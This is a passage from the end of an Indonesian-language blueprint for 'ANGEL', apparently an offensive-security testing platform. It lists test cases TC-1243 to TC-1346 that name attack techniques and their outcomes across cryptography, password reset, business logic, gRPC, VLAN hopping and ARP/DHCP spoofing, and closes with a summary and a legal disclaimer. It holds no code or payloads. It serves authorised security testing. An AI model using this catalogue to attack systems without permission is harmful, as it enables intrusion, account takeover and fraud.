├── TC-1243 ECB cut/paste                       → Block reorder
├── TC-1244 Length extension                    → Suffix forge
├── TC-1245 Hash collision                      → Duplicate input
├── TC-1246 Weak hash MD5                       → Fast collision
├── TC-1247 Predictable random                  → Seed guess
├── TC-1248 Nonce reuse                         → Keystream leak
├── TC-1249 Key reuse                           → Cross-message decrypt
├── TC-1250 IV reuse                            → Duplicate keystream
├── TC-1251 ECDSA nonce reuse                   → Private key recovery
├── TC-1252 RSA low exponent                    → Root decrypt
├── TC-1253 RSA padding oracle                  → Blind decrypt
├── TC-1254 DH small subgroup                   → Key reduce
├── TC-1255 JWT none alg                        → None accepted
├── TC-1256 JWT HS/RS confusion                 → Signature forge
├── TC-1257 JWT kid injection                   → Key confusion
├── TC-1258 JWT jku confusion                   → Key URL hijack
├── TC-1259 Crypto fault                        → Timing-based
├── TC-1260 SSL renegotiation                   → Session prefix
├── TC-1261 CBC-MAC flaw                        → MAC forge
└── TC-1262 Full crypto chain                   → Full chain success
```

### Layer 66: Password Reset

```
LAYER 66 - PASSWORD RESET:
├── TC-1263 Reset token in URL                  → Token leaked
├── TC-1264 Reset token guessable              → Token predict
├── TC-1265 User enumeration via reset          → User existence leak
├── TC-1266 Reset poisoning (host header)       → Poisoned email link
├── TC-1267 Email spoofed reset                 → Replacement reset
├── TC-1268 SMS hijack reset                    → SIM swap
├── TC-1269 Reset response manipulation         → Response tamper
├── TC-1270 Session invalidation failure        → Stale session
├── TC-1271 Reset token reuse                   → Reuse password
├── TC-1272 Race on reset                       → Parallel reset
├── TC-1273 Timing attack reset                 → Time oracle
├── TC-1274 Answer-based reset                  → Guessable set
├── TC-1275 Reset username confusion            → Mass assignment
├── TC-1276 Reset mail IDOR                     → Cross-user email
├── TC-1277 Temporary password default          → Default reuse
├── TC-1278 Account lock bypass                 → Brute reset
└── TC-1279 Full reset chain                    → Full chain success
```

### Layer 67: Business Logic

```
LAYER 67 - BUSINESS LOGIC:
├── TC-1280 Negative quantity                   → Negative total
├── TC-1281 Integer overflow pricing            → Inflated discount
├── TC-1282 Currency rounding                   → Rounding toss
├── TC-1283 Discount stacking                   → Stack multiplier
├── TC-1284 Coupon reuse                        → Reused coupon
├── TC-1285 Gift card race                      → Balance dup
├── TC-1286 Price manipulation                  → Manipulated total
├── TC-1287 Step-skip flow                      → Skip step
├── TC-1288 State machine abuse                 → Unreachable state
├── TC-1289 Missing approval                    → Approval skip
├── TC-1290 Privileged action                   → Privilege function
├── TC-1291 Bulk operation abuse                → Bulk misuse
├── TC-1292 Loyalty points                      → Points inflate
├── TC-1293 Rate limit logic bypass             → Rate bypass
├── TC-1294 OAuth transaction binding           → Unbound transaction
├── TC-1295 Free trial abuse                    → Trial loop
├── TC-1296 Refund abuse                        → Refund dup
├── TC-1297 Signup bonus farming                → Bonus farm
├── TC-1298 Transfer double-spend               → Duplicate transfer
└── TC-1299 Full business logic chain           → Full chain success
```

### Layer 68: gRPC

```
LAYER 68 - GRPC:
├── TC-1300 Reflection disclosure               → Service dump
├── TC-1301 Unauthenticated method call         → Unprotected call
├── TC-1302 Protobuf tamper                     → Field mutation
├── TC-1303 Trailing fields smuggling           → Field smuggling
├── TC-1304 HTTP/2 TE smuggling                 → Desync
├── TC-1305 Metadata injection                  → Header poison
├── TC-1306 TLS-terminated gRPC stripping       → Plaintext fallback
├── TC-1307 gRPC-web bypass                     → CORS/CSRF
├── TC-1308 Streaming DoS                       → Stream flood
├── TC-1309 Interceptor auth bypass             → Authz skip
├── TC-1310 Health check abuse                  → Status spoof
├── TC-1311 Proto decoding DoS                  → Recursion crash
├── TC-1312 Reflection schema extraction        → Schema leak
├── TC-1313 Status code info leak               → Debug status
├── TC-1314 Deadline abuse                      → Long window
└── TC-1315 Full gRPC chain                     → Full chain success
```

### Layer 69: VLAN

```
LAYER 69 - VLAN:
├── TC-1316 VLAN hopping (double tagging)       → Native VLAN access
├── TC-1317 Switch spoofing DTP                 → Trunk negotiation
├── TC-1318 VTP injection                       → VLAN redirection
├── TC-1319 STP BPDU spoof                      → Root role
├── TC-1320 CAM table flooding                  → MAC overflow
├── TC-1321 PVLAN escalation                    → Isolated breach
├── TC-1322 Trunk misconfig                     → Cross-VLAN
├── TC-1323 VLAN misconfig broadcast            → Broadcast flood
├── TC-1324 QinQ cross-VLAN                     → Stack bypass
├── TC-1325 802.1Q tag mutation                 → Tag flip
├── TC-1326 DTP disabled bypass                 → Alternate protocol
├── TC-1327 MAC flooding timeout                → Cache flush
├── TC-1328 Virtualization VLAN                 → VM escape
└── TC-1329 Full VLAN chain                     → Full chain success
```

### Layer 70: ARP/DHCP

```
LAYER 70 - ARP/DHCP:
├── TC-1330 ARP spoofing                        → MITM in place
├── TC-1331 ARP cache poisoning                 → Cache poisoned
├── TC-1332 ARP MITM session hijack             → Session taken
├── TC-1333 Gratuitous ARP DoS                  → Route redirect
├── TC-1334 ARP storm                           → Network DoS
├── TC-1335 DHCP starvation                     → Pool exhausted
├── TC-1336 Rogue DHCP server                   → Fake lease
├── TC-1337 DHCP spoofing gateway               → Fake gateway
├── TC-1338 DHCPv6 spoof                        → RA/DHCPv6
├── TC-1339 DHCP relay abuse                    → Relay MITM
├── TC-1340 DHCP option 82 trust                → Trust abuse
├── TC-1341 ARP poisoning gateway pivot         → Pivot path
├── TC-1342 MITM TLS downgrade                  → Downgrade attempt
├── TC-1343 DNS via DHCP spy                    → DNS leak
├── TC-1344 ARP/DHCP combined                   → Full combo
├── TC-1345 MAC spoof bypass NAC                → NAC bypass
└── TC-1346 Full ARP/DHCP chain                 → Full chain success
```

---

## 39. KESIMPULAN

ANGEL adalah platform offensive security tingkat lanjut untuk P0/P1 findings. Platform ini mencakup 70 layer dengan ~2100+ modules, mencakup konvensional red team, cloud-native, container, mobile, wireless, social engineering, supply chain, Web3, AI/ML, IPv6, SAML/OIDC, LDAP, CSRF, web cache poisoning, HTTP smuggling, SCADA/ICS, IoT, compliance testing, OPSEC, memory corruption, deserialization, race conditions, GraphQL, cryptography, password reset, business logic, gRPC, VLAN hopping, dan ARP/DHCP spoofing. Setiap layer memiliki minimal 5-7 teknik alternatif, fallback otomatis, deteksi environment, adaptasi, edge case handling, resilience, dan recovery. Semua 70 layer memiliki fallback chains, edge cases, dan test scenarios (total 1.346 test case, TC-001–TC-1346).

---

## 40. LEGAL & SAFETY DISCLAIMER

> **PENTING:** Blueprint ini hanya untuk tujuan pendidikan, penelitian, dan pengujian keamanan yang sah. Dilarang keras menggunakan untuk menyerang sistem tanpa izin tertulis. Pelanggaran dikenakan sanksi pidana dan perdata.
